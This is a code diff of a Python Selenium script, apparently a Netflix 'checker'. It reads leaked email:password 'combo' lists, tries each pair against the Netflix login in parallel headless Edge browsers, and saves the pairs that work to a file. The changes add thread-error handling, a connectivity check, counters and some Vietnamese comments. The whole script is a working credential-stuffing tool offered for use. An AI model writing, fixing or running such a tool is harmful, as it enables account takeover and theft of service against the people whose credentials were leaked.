@@ -1,5 +1,6 @@
 import sys
 import time
+import requests
 from selenium import webdriver
 from selenium.webdriver.edge.service import Service
 from selenium.webdriver.common.by import By
@@ -10,9 +11,8 @@ from selenium.common.exceptions import TimeoutException, WebDriverException
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
 # EdgeDriver Path
-EDGEDRIVER_PATH = "C:\\Users\\ADMIN\\Downloads\\netflix-checker\\msedgedriver.exe"
+EDGEDRIVER_PATH = "C:\\Users\\ADMIN\\Downloads\\netflix-checker\\msedgedriver.exe" #dg dẫn đến msedgerdriver
 
-# Banner printing function
 def print_banner():
     banner = """
 ____   _________.___.____  __.  _____    _______  ___________.____    ._______  ___
@@ -24,7 +24,7 @@ ____   _________.___.____  __.  _____    _______  ___________.____    ._______  
 """
     print(banner)
 
-# Function asks user if they want to run tools
+# Menu
 def ask_user():
     while True:
         choice = input("Do you want to run now? (yes/no): ").strip().lower()
@@ -33,7 +33,7 @@ def ask_user():
             time.sleep(1)
             return True
         elif choice == "no":
-            print("Existing. Goodbye!")
+            print("Exiting. Goodbye!")
             sys.exit()
         else:
             print("Invalid selection. Please enter 'yes' or 'no'.")
@@ -53,7 +53,17 @@ def clean_file(input_file, output_file):
             outfile.write(account + "\n")
     print(f"File cleaned. Valid account number: {len(cleaned_accounts)}")
 
-# Netflix account check function
+# Check network connect dc chưa
+def check_network():
+    try:
+        requests.get("https://www.netflix.com", timeout=5)
+        return True
+    except requests.ConnectionError:
+        print("[!] Network error. Retrying...")
+        time.sleep(5)
+        return False
+
+# function
 def check_account(account):
     email, password = account.strip().split(":")
     options = webdriver.EdgeOptions()
@@ -62,7 +72,7 @@ def check_account(account):
     options.add_argument("--no-sandbox")
     options.add_argument("--disable-dev-shm-usage")
     options.add_argument("--disable-extensions")
-    options.add_argument("--log-level=3")  # Hide browser logs
+    options.add_argument("--log-level=3")
 
     service = Service(EDGEDRIVER_PATH)
     driver = None
@@ -77,53 +87,69 @@ def check_account(account):
 
         if "browse" in driver.current_url:
             print(f"[+] Valid account: {email}")
-            return f"{email}:{password}"
+            return "valid"
         else:
             print(f"[-] Invalid account: {email}")
+            return "invalid"
     except TimeoutException:
         print(f"[!] Timeout: {email}")
+        return "invalid"
     except WebDriverException as e:
         print(f"[!] Browser error {email}: {str(e)}")
+        return "invalid"
     finally:
         if driver:
-            driver.quit()
-    return None
+            try:
+                driver.quit()
+            except Exception as e:
+                print(f"[!] Error closing browser for {email}: {str(e)}")
 
-# Multithreaded test run function
-def process_accounts(input_file, output_file, max_threads=20):
+# đa luồn
+def process_accounts(input_file, output_file, max_threads=10):
+    valid_count = 0
+    invalid_count = 0
     results = []
+
     with open(input_file, "r") as file:
         accounts = [line.strip() for line in file if line.strip()]
 
     with ThreadPoolExecutor(max_threads) as executor:
-        futures = [executor.submit(check_account, account) for account in accounts]
+        futures = {executor.submit(check_account, account): account for account in accounts}
         for future in as_completed(futures):
-            result = future.result()
-            if result:
-                results.append(result)
+            try:
+                result = future.result(timeout=60)  # timeout
+                if result == "valid":
+                    valid_count += 1
+                    results.append(futures[future])
+                else:
+                    invalid_count += 1
+            except Exception as e:
+                print(f"[!] Thread error: {str(e)}")
+                invalid_count += 1
 
-# Write results to file
+    # write to file: valid
     with open(output_file, "w") as f:
         for account in results:
             f.write(account + "\n")
 
-    print(f"\nTotal valid accounts: {len(results)}")
-    print("The tool has completed all the work. The program will end now..")
+    print(f"\nTotal valid accounts: {valid_count}")
+    print(f"Total invalid accounts: {invalid_count}")
+    print("The tool has completed all the work. The program will end now.")
 
-# Main function
 def main():
     print_banner()
     if ask_user():
         raw_input_file = "combo.txt"
         cleaned_file = "cleaned_combo.txt"
         output_file = "Active.txt"
-        max_threads = 20  # Maximum number of threads
+        max_threads = 10  # số luồn
 
-# Clean up files
+        # xóa acc k đúng 
         clean_file(raw_input_file, cleaned_file)
 
-# Run account check tool
-        process_accounts(cleaned_file, output_file, max_threads)
+        if check_network():
+
+            process_accounts(cleaned_file, output_file, max_threads)
 
 if __name__ == "__main__":
     main()
